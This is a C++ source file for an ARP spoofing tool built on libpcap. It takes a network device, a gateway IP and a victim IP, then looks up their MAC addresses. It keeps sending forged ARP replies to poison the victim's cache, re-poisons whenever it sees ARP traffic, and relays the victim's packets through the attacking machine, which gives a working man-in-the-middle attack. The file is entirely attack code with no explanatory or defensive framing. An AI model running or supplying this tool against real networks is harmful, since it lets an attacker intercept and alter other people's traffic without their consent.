#include <arpa/inet.h>//ip -> bin
#include <cstring>
#include <cstdio>
#include <ifaddrs.h>
#include <iostream>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pcap.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <thread>
#include <unistd.h>

#define PCAP_OPENFLAG_PROMISCUOUS   1   // Even if it isn't my mac, receive packet

using namespace std;
namespace
{
    volatile sig_atomic_t quit;
    void signal_handler(int sig)
        {
            signal(sig, signal_handler);
            quit = 1;
        }
}
#pragma pack(push,1)
struct _ether_hdr{
    uint8_t Dst_mac[6];
    uint8_t Src_mac[6];
    uint16_t ether_type;
};
struct _arp_hdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;  //mac len
  uint8_t plen;  //ip len
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint32_t sender_ip;
  uint8_t target_mac[6];
  uint32_t target_ip;
};
struct my_hdr {
    struct _ether_hdr eh;
    struct _arp_hdr ah;
};
#pragma pack(pop)
void arp_request(char *snd_ip,uint8_t *snd_mac,char *trg_ip,pcap_t *fp)
{
    struct my_hdr mh;
    struct _ether_hdr *eh = &mh.eh;
    struct _arp_hdr *ah = &mh.ah;
    inet_pton(AF_INET,snd_ip,&ah->sender_ip);
    memcpy(eh->Src_mac,snd_mac,6);
    inet_pton(AF_INET,trg_ip,&ah->target_ip);
    memset(eh->Dst_mac,0xFF,sizeof(eh->Dst_mac));
    memcpy(ah->sender_mac,eh->Src_mac,6);
    memset(ah->target_mac,0x00,sizeof(ah->target_mac));
    eh->ether_type = ntohs(0x0806);
    ah->htype = ntohs(0x0001);
    ah->ptype = ntohs(0x0800);
    ah->hlen = 0x06;
    ah->plen = 0x04;
    ah->opcode = ntohs(0x0001);
    if(pcap_sendpacket(fp,(const u_char*)&mh,42) != 0)
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
    }
}
void arp_infection(char *snd_ip,uint8_t *snd_mac,char *trg_ip, uint8_t *trg_mac,int ws,pcap_t *fp)
{
    cout<<"start arp infection..."<<endl;
    struct my_hdr mh;
    struct _ether_hdr *eh = &mh.eh;
    struct _arp_hdr *ah = &mh.ah;
    inet_pton(AF_INET,snd_ip,&ah->sender_ip);
    memcpy(eh->Src_mac,snd_mac,6);
    inet_pton(AF_INET,trg_ip,&ah->target_ip);
    memcpy(eh->Dst_mac,trg_mac,6);
    memcpy(ah->sender_mac,eh->Src_mac,6);
    memcpy(ah->target_mac,eh->Dst_mac,6);
    eh->ether_type = ntohs(0x0806);
    ah->htype = ntohs(0x0001);
    ah->ptype = ntohs(0x0800);
    ah->hlen = 0x06;
    ah->plen = 0x04;
    ah->opcode = ntohs(0x0002);
    quit = ws;  //select whether to infect or periodically infect
    do
    {
        if(pcap_sendpacket(fp,(const u_char*)&mh,42) != 0)
        {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
        }
        if(ws == 0)
        sleep(1);
    }while(!quit);
    if(ws == 1)
        quit = 0;
}
void get_my_addr(const char*ifname,char* outputmyip,uint8_t*outputmymac)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if(s < 0)
        perror("socket fail");
    struct ifreq ifr;
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
        perror("ioctl fail");
    memcpy(outputmymac,ifr.ifr_hwaddr.sa_data,6);

    struct ifaddrs * ifAddrStruct=NULL;
    struct ifaddrs * ifa=NULL;
    void * tmpAddrPtr=NULL;

    getifaddrs(&ifAddrStruct);
    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next)
    {
        if (!ifa->ifa_addr)
        {
            continue;
        }
        if (ifa->ifa_addr->sa_family == AF_INET)
        { // check it is IP4
            if(strcmp(ifa->ifa_name,ifname)==0)
            {
                tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
                inet_ntop(AF_INET, tmpAddrPtr, outputmyip, INET_ADDRSTRLEN);
            }
        }
    }
}
void get_target_mac(uint8_t *output_target_mac,char *target_ip,pcap_t *fp){
    struct pcap_pkthdr *pkt_header;
    const u_char *pkt_data;
    int res;

    struct _ether_hdr *eh;
    struct _arp_hdr *arph;
    uint16_t etype;
    uint32_t u32input_ip;
    uint32_t u32target_ip;

    inet_pton(AF_INET,target_ip,&u32input_ip);

    while((res=pcap_next_ex(fp,&pkt_header,&pkt_data))>=0)
    {
        if(res== 0)continue;
        eh = (struct _ether_hdr*)pkt_data;
        pkt_data+=sizeof(struct _ether_hdr);
        etype = ntohs(eh->ether_type);
        if(etype == ETHERTYPE_ARP)
        {
            arph = (struct _arp_hdr*)pkt_data;
            u32target_ip = arph->sender_ip;
            if(u32input_ip == u32target_ip)
            memcpy(output_target_mac,eh->Src_mac,6);
        }
        break;
    }
}
void anti_recovery_and_relay_packet(char *snd_ip,uint8_t *snd_mac,char *trg_ip, uint8_t *trg_mac,char *atk_ip,uint8_t *rcv_mac,pcap_t *fp)
{
    struct pcap_pkthdr *pkt_header;
    const u_char *pkt_data;
    int res;

    struct _ether_hdr *eh;
    struct iphdr *iph;

    uint16_t etype;
    uint32_t u32_atk_ip;

    inet_pton(AF_INET,atk_ip,&u32_atk_ip);

    while(!quit)
    {
        while((res=pcap_next_ex(fp,&pkt_header,&pkt_data))>=0)
        {
            if(res== 0)continue;
            eh = (struct _ether_hdr*)pkt_data;
            etype = ntohs(eh->ether_type);
            iph = (struct iphdr*)(pkt_data+sizeof(struct _ether_hdr));
            if(etype == ETHERTYPE_ARP)
            {
                cout<<"Detected ARP Packet!"<<endl;
                arp_infection(snd_ip,snd_mac,trg_ip,trg_mac,1,fp);
            }
            if(etype == ETHERTYPE_IP)
            {
                if(strcmp((char*)snd_mac,(char*)eh->Dst_mac)==0)
                {
                    if(!(u32_atk_ip == iph->saddr))
                    {
                        memcpy(eh->Dst_mac,rcv_mac,6);
                        memcpy(eh->Src_mac,snd_mac,6);
                        if(pcap_sendpacket(fp,pkt_data,(sizeof(struct _ether_hdr)+htons(iph->tot_len)))!=0)
                        {
                            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
                        }
                        break;
                    }
                }
            }
        }
    }

}
int main(int argc,char *argv[])
{
    if(argc != 4)
    {
        cout<<"not enough argument!"<<endl;
        cout<<"EX : DEVICE Gateway_IP TARGET_IP"<<endl;
        return 1;
    }
/*  attacker= atk_ip,atk_mac    (attacker)
    sender	= snd_ip,snd_mac    (victim)
    receiver= rcv_ip,rcv_mac    (gateway)*/

    char *dev = argv[1];    //get device name
    char atk_ip[INET_ADDRSTRLEN];
    uint8_t atk_mac[6];
    char *snd_ip = argv[3]; //get victim ip addr
    uint8_t snd_mac[6];
    char *rcv_ip = argv[2]; //get gateway ip addr
    uint8_t rcv_mac[6];

    get_my_addr(dev,atk_ip,atk_mac);    //get My ip , mac address

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *fp;
    if((fp= pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS , 1, errbuf)) == NULL)
    {
        fprintf(stderr,"Unable to open the adapter. %s is not supported by Pcap\n", dev);
    }
    arp_request(atk_ip,atk_mac,snd_ip,fp);      //send who has sender_ip?
    get_target_mac(snd_mac,snd_ip,fp);          //If I have sender's ip, give my mac to attacker
    arp_request(atk_ip,atk_mac,rcv_ip,fp);      //send who has gateway_ip?
    get_target_mac(rcv_mac,rcv_ip,fp);          //If I have gateway's ip, give my mac to attacker

    signal(SIGINT,signal_handler);
    thread t1(arp_infection,rcv_ip,atk_mac,snd_ip,snd_mac,0,fp);  //send arp_infection to victim periodically
    anti_recovery_and_relay_packet(rcv_ip,atk_mac,snd_ip,snd_mac,atk_ip,rcv_mac,fp);
    t1.join();
}
